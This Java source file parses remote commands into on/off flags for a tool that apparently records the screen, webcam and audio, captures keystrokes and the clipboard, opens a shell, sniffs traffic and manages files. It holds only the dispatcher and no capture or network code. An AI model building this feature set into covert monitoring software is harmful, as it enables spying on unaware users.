/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Connection;

import static Connection.Command.*;
import java.util.Arrays;

/**
 *
 * @author abaza
 */
public class TasksWorks {

    public void parcing(String command) {
        String[] Tasks = command.split(":");
        String[] Units = Arrays.copyOfRange(Tasks, 3, Tasks.length);

        for (String Task : Units) {
            String[] Unit = Task.split("=");
            int Code = Integer.parseInt(Unit[0]);
            switch (Code) {
                case OPERON:
                    KEY_OPERON = (Unit[1].equals("true"));
                    break;
                case SHUTDOWN:
                    KEY_SHUTDOWN = (Unit[1].equals("true"));
                    break;
                case RESTART:
                    KEY_RESTART = (Unit[1].equals("true"));
                    break;
                case SCREEN_RECORD:
                    KEY_SCREEN_RECORD = (Unit[1].equals("true"));
                    break;
                case STOP_SCREEN_RECORD:
                    KEY_STOP_SCREEN_RECORD = (Unit[1].equals("true"));
                    break;
                case SCREEN_SHUT:
                    KEY_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case STOP_SCREEN_SHUT:
                    KEY_STOP_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case ZIP_FLAG_SCREEN_SHUT:
                    KEY_ZIP_FLAG_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case STOP_ZIP_FLAG_SCREEN_SHUT:
                    KEY_STOP_ZIP_FLAG_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case RESEVED_FLAG_SCREEN_SHUT:
                    KEY_RESEVED_FLAG_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case STOP_RESEVED_FLAG_SCREEN_SHUT:
                    KEY_STOP_RESEVED_FLAG_SCREEN_SHUT = (Unit[1].equals("true"));
                    break;
                case SCREEN_MONITOR:
                    KEY_SCREEN_MONITOR = (Unit[1].equals("true"));
                    break;
                case STOP_SCREEN_MONITOR:
                    KEY_STOP_SCREEN_MONITOR = (Unit[1].equals("true"));
                    break;
                case SCREEN_WEBCAM:
                    KEY_SCREEN_WEBCAM = (Unit[1].equals("true"));
                    break;
                case STOP_SCREEN_WEBCAM:
                    KEY_STOP_SCREEN_WEBCAM = (Unit[1].equals("true"));
                    break;
                case AUDIO_LIFE:
                    KEY_AUDIO_LIFE = (Unit[1].equals("true"));
                    break;
                case STOP_AUDIO_LIFE:
                    KEY_STOP_AUDIO_LIFE = (Unit[1].equals("true"));
                    break;
                case AUDIO_RECORD:
                    KEY_AUDIO_RECORD = (Unit[1].equals("true"));
                    break;
                case STOP_AUDIO_RECORD:
                    KEY_STOP_AUDIO_RECORD = (Unit[1].equals("true"));
                    break;
                case KEYBORD:
                    KEY_KEYBORD = (Unit[1].equals("true"));
                    break;
                case STOP_KEYBORD:
                    KEY_STOP_KEYBORD = (Unit[1].equals("true"));
                    break;
                case CLIPBORD:
                    KEY_CLIPBORD = (Unit[1].equals("true"));
                    break;
                case STOP_CLIPBORD:
                    KEY_STOP_CLIPBORD = (Unit[1].equals("true"));
                    break;
                case APPLICATION:
                    KEY_APPLICATION = (Unit[1].equals("true"));
                    break;
                case STOP_APPLICATION:
                    KEY_STOP_APPLICATION = (Unit[1].equals("true"));
                    break;
                case SHELL:
                    KEY_SHELL = (Unit[1].equals("true"));
                    break;
                case STOP_SHELL:
                    KEY_STOP_SHELL = (Unit[1].equals("true"));
                    break;
                case FILEMANGER:
                    KEY_FILEMANGER = (Unit[1].equals("true"));
                    break;
                case STOP_FILEMANGER:
                    KEY_STOP_FILEMANGER = (Unit[1].equals("true"));
                    break;
                case USB:
                    KEY_USB = (Unit[1].equals("true"));
                    break;
                case STOP_USB:
                    KEY_STOP_USB = (Unit[1].equals("true"));
                    break;
                case SNIFFER:
                    KEY_SNIFFER = (Unit[1].equals("true"));
                    break;
                case STOP_SNIFFER:
                    KEY_STOP_SNIFFER = (Unit[1].equals("true"));
                    break;
                case FOOTPRINT:
                    KEY_FOOTPRINT = (Unit[1].equals("true"));
                    break;
                case STOP_FOOTPRINT:
                    KEY_STOP_FOOTPRINT = (Unit[1].equals("true"));
                    break;
                case INOFFICEORNOT:
                    KEY_INOFFICEORNOT = (Unit[1].equals("true"));
                    break;
                case STOP_INOFFICEORNOT:
                    KEY_STOP_INOFFICEORNOT = (Unit[1].equals("true"));
                    break;
                case PHONE:
                    KEY_PHONE = (Unit[1].equals("true"));
                    break;
                case STOP_PHONE:
                    KEY_STOP_PHONE = (Unit[1].equals("true"));
                    break;
                case DOWNLOAD:
                    KEY_DOWNLOAD = (Unit[1].equals("true"));
                    break;
                case STOP_DOWNLOAD:
                    KEY_STOP_DOWNLOAD = (Unit[1].equals("true"));
                    break;
            }
        }
    }

}
